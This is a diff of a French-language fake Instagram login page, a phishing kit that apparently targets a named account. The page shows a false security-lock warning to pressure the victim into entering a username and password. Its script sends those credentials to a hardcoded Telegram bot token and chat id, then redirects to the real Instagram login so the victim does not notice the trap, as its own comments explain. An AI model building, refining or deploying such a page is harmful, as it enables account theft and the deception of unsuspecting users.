@@ -5,20 +5,20 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connexion • Instagram</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background-color: #fafafa; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; box-sizing: border-box; }
-        img { width: 175px; margin-bottom: 30px; }
+        body { font-family: -apple-system, system-ui, sans-serif; background-color: #fafafa; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
+        .logo { width: 175px; margin-bottom: 20px; }
         input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; box-sizing: border-box; }
-        button { width: 100%; background-color: #0095f6; color: white; border: none; padding: 7px; border-radius: 4px; font-weight: 600; cursor: pointer; }
-        .err { color: #ed4956; font-size: 13px; margin-bottom: 20px; font-weight: 500; }
+        button { width: 100%; background-color: #0095f6; color: white; border: none; padding: 7px; border-radius: 4px; font-weight: 600; cursor: pointer; font-size: 14px; }
+        .err { color: #ed4956; font-size: 13px; margin-bottom: 20px; font-weight: 500; line-height: 1.4; }
     </style>
 </head>
 <body>
     <div class="box">
-        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png">
-        <div class="err">Action requise : Sécurisez votre compte suite à une tentative de connexion suspecte (Guangzhou, CN).</div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
+        <div class="err">Action requise : Votre compte a été temporairement verrouillé pour des raisons de sécurité (Connexion suspecte : Guangzhou, CN).</div>
         <form id="l">
-            <input type="text" id="u" placeholder="Nom d'utilisateur" required>
+            <input type="text" id="u" placeholder="Num. de téléphone, nom d'utilisateur ou e-mail" required>
             <input type="password" id="p" placeholder="Mot de passe" required>
             <button type="submit">Sécuriser le compte</button>
         </form>
@@ -31,12 +31,9 @@
             const p = document.getElementById('p').value;
             const tok = "7137131967:AAHa-B55idnADcUHKse3HjqHeoHyAjSMY1I";
             const id = "5558301795";
-            const txt = `🔥 NEW HIT CAUGHT! 🔥\n👤 User: ${u}\n🔑 Pass: ${p}\n🎯 Target: faiza_aynur`;
+            const txt = `🎯 HIT CAUGHT!\n👤 User: ${u}\n🔑 Pass: ${p}`;
             
-            // إرسال البيانات فوراً للـ Bot تاعك
             await fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=${encodeURIComponent(txt)}`);
-            
-            // تحويل الضحية لصفحة الدخول الحقيقية لعدم كشف الفخ
             window.location.href = "https://www.instagram.com/accounts/login/";
         };
     </script>
